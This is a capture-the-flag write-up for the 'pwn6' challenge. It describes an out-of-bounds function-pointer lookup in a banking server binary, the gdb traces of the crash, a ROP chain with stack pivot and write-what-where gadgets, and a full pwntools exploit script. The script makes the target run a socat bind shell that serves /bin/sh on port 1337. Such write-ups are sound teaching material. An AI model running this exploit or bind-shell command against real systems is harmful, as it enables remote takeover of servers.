# pwn6 - Pwn

We're given two binaries, a server binary and a client binary aswell as a OpenVPN configuration file to be used when executing the exploit remotely.

Server protection:
```
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Launching the server and connecting to it with the binary gives us the following output:

```
	 0. View Recent Login's With client
	 1. Login
Enter command to send to server...
```

Option 0 gives us:

```
Most recent login's from this client
1. 1337
2. 23646
...
```

and option 1 gives us a prompt to login.

When inspecting the client binary we can observe other options which presumably would be unlocked once successfully authenticated to the server.

When running the server, an empty 'Banking.sqlite' database is created which presumably would contain the credentials which would allow us to login with client.

Inspecting the login routine in the server binary with IDA eventually leads us to the `process_message` function.

<img src="https://i.imgur.com/heKlCKX.png">

Right off the bat there's a vulnerable printf call which seemed to be the thing to take advantage off in this challenge. With server binary having PIE disabled it would be quite easy to redirect some libc call to a ROP-chain.

However, the condition for even getting into the vulnerable printf branch is to send a corrupted message to the server which to my understanding seemed to drop the connection to the client so a new approach was needed.

Just before branching to the malformed message branch, there's a lookup for a function pointer depending on the value in the RDX register.

```
mov rax, [rax + rdx * 8 + 0x8]
```

The server determines what options a client can send depending on what function pointers exists in this array. If the array contains a null pointer at an index, it means that the user does not have access to this function. Initially I thought this array access was checked for out of bounds, but as it turns out, it was not. Thus we have a execution primitive to get RIP-control when the server is calling the function pointer later on.

Inspecting the messages sent by client we could create the following message to determine the value of RDX in the array lookup:

```python
def array_lookup(rdx, payload):
    return '\x0a' + '\x00' * 2 + '\x00' + pwn.p32(rdx - 4) + payload 
```

Due to the message structure, we're limited to only the lower 4 bytes of the RDX register. The payload parameter can take arbitrary data and will be stored on both the stack and the heap when the server is calling the fake function pointer.

## Exploit

```
[----------------------------------registers-----------------------------------]
RAX: 0x409070 (<pcacheMergeDirtyList+96>:	add    rsp,0x58)
RBX: 0x0 
RCX: 0x6d5f10 --> 0x5 
RDX: 0x7fffffffda70 --> 0x4 
RSI: 0x6d5f10 --> 0x5 
RDI: 0x7fffffffda70 --> 0x4 
RBP: 0x7fffffffd560 --> 0x7fffffffda50 --> 0x7fffffffddb0 --> 0x4a8720 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffd540 --> 0x6d5f10 --> 0x5 
RIP: 0x404cf4 (<process_message+91>:	call   rax)
R8 : 0xfffffffffffffff0 
R9 : 0x0 
R10: 0x6d3010 --> 0x200010001000102 
R11: 0x6d6270 --> 0x680000000a ('\n')
R12: 0x404770 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde90 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x404cea <process_message+81>:	mov    rdx,QWORD PTR [rbp-0x18]
   0x404cee <process_message+85>:	mov    rsi,rcx
   0x404cf1 <process_message+88>:	mov    rdi,rdx
=> 0x404cf4 <process_message+91>:	call   rax
   0x404cf6 <process_message+93>:	mov    DWORD PTR [rbp-0xc],eax
   0x404cf9 <process_message+96>:	mov    eax,DWORD PTR [rbp-0xc]
   0x404cfc <process_message+99>:	mov    esi,eax
   0x404cfe <process_message+101>:	mov    edi,0x4a886e
Guessed arguments:
arg[0]: 0x7fffffffda70 --> 0x4 
arg[1]: 0x6d5f10 --> 0x5 
arg[2]: 0x7fffffffda70 --> 0x4 
arg[3]: 0x6d5f10 --> 0x5 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd540 --> 0x6d5f10 --> 0x5 
0008| 0x7fffffffd548 --> 0x7fffffffda70 --> 0x4 
0016| 0x7fffffffd550 --> 0x0 
0024| 0x7fffffffd558 --> 0x6d6270 --> 0x680000000a ('\n')
0032| 0x7fffffffd560 --> 0x7fffffffda50 --> 0x7fffffffddb0 --> 0x4a8720 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffd568 --> 0x4052be (<handle_connections+1397>:	mov    rax,QWORD PTR [rbp-0x10])
0048| 0x7fffffffd570 --> 0x6d32c8 --> 0x6d1a80 --> 0x7000000003 
0056| 0x7fffffffd578 --> 0x7fffffffda70 --> 0x4 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```
```
gdb-peda$ telescope $rsp
0000| 0x7fffffffd540 --> 0x6d5f10 --> 0x5 
0008| 0x7fffffffd548 --> 0x7fffffffda70 --> 0x4 
0016| 0x7fffffffd550 --> 0x0 
0024| 0x7fffffffd558 --> 0x6d6270 --> 0x680000000a ('\n')
0032| 0x7fffffffd560 --> 0x7fffffffda50 --> 0x7fffffffddb0 --> 0x4a8720 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffd568 --> 0x4052be (<handle_connections+1397>:	mov    rax,QWORD PTR [rbp-0x10])
0048| 0x7fffffffd570 --> 0x6d32c8 --> 0x6d1a80 --> 0x7000000003 
0056| 0x7fffffffd578 --> 0x7fffffffda70 --> 0x4 
gdb-peda$ telescope $rsp 20
0000| 0x7fffffffd540 --> 0x6d5f10 --> 0x5 
0008| 0x7fffffffd548 --> 0x7fffffffda70 --> 0x4 
0016| 0x7fffffffd550 --> 0x0 
0024| 0x7fffffffd558 --> 0x6d6270 --> 0x680000000a ('\n')
0032| 0x7fffffffd560 --> 0x7fffffffda50 --> 0x7fffffffddb0 --> 0x4a8720 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffd568 --> 0x4052be (<handle_connections+1397>:	mov    rax,QWORD PTR [rbp-0x10])
0048| 0x7fffffffd570 --> 0x6d32c8 --> 0x6d1a80 --> 0x7000000003 
0056| 0x7fffffffd578 --> 0x7fffffffda70 --> 0x4 
0064| 0x7fffffffd580 --> 0x680000000a ('\n')
0072| 0x7fffffffd588 ('A' <repeats 200 times>...)
```

Breaking on the call of the function pointer shows us that RSP is not pointing to our payload, so our first ROP-gadget has the pivot the stack to it. Fortunately, the server binary contains a lot of functions so finding suitable gadgets is quite easy. To pivot the stack we use the following gadget

```
   0x0000000000409070 <+96>:	add    rsp,0x58
   0x0000000000409074 <+100>:	ret 
```

which will RSP right on the payload.

The first idea was to just spawn a shell, which would be easy as libc `system` existed in PLT. There wasn't however any reference to a `/bin/sh` string so a write-primtive was required to write it somewhere in memory. The following gadgets does the trick

```
0x00000000004021ce <+160>:	pop    rdi
0x00000000004021cf <+161>:	ret

0x0000000000409073 <+99>:	pop    rax
0x0000000000409074 <+100>:	ret

0x0000000000408e46 <+118>:	mov    QWORD PTR [rax+0x10],rdi
0x0000000000408e4a <+122>:	ret
```

This worked, but as this isn't a regular challenge where stdin and stdout is piped to the network, this would only spawn a shell on the server-side and be completely useless on the client.

Had some ideas trying to pipe stdout and stdin to the network socket but it seemed rather complicated. The final idea was to hope that the server had `socat` available and simply launch `/bin/sh` over some random port and then simply connect to it.

So in short, pass `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"/bin/sh"` to `system`.

To my own surprise it did work and connecting to the server with `nc` gave us the flag.

```
gigem{dbff08334bfc2ae509f83605e4285b0e}
```

```python
import pwn

SYSTEM_PLT = 0x401a10
STACK_PIVOT = 0x409070
POP_RDI = 0x4021ce
MOV_RAX_RDI = 0x408e46
BINSH = 0x006d1000
POP_RAX = 0x409073
RET = 0x401e7c
POP_RSI = 0x401e89

def write_what_where(what, where):
    chain = ''
    for i in range(0, len(what) - 8, 8):
        chain += pwn.p64(POP_RDI)
        chain += what[i:i+8]
        chain += pwn.p64(POP_RAX)
        chain += pwn.p64(where - 0x10 + i)
        chain += pwn.p64(MOV_RAX_RDI)
    
    remainder = len(what) % 8
    extra = what[-remainder:]
    extra += (8 - len(extra)) * '\x00'
    chain += pwn.p64(POP_RDI)
    chain += extra
    chain += pwn.p64(POP_RAX)
    chain += pwn.p64(where - 0x10 + len(what) - remainder)
    chain += pwn.p64(MOV_RAX_RDI)

    return chain

def array_lookup(rdx, payload):
    return '\x0a' + '\x00' * 2 + '\x00' + pwn.p32(rdx - 4) + payload 

p = pwn.remote('172.30.0.2', 6210)
#p = pwn.remote('127.0.0.1', 6210)

rop  = pwn.p64(STACK_PIVOT)
rop += write_what_where('socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"/bin/sh"\x00', BINSH)
rop += pwn.p64(POP_RDI)
rop += pwn.p64(BINSH)
rop += pwn.p64(RET) * 3 #Align the heap correctly
rop += pwn.p64(SYSTEM_PLT)

p.send(array_lookup(0x6c, rop))
p.interactive()
```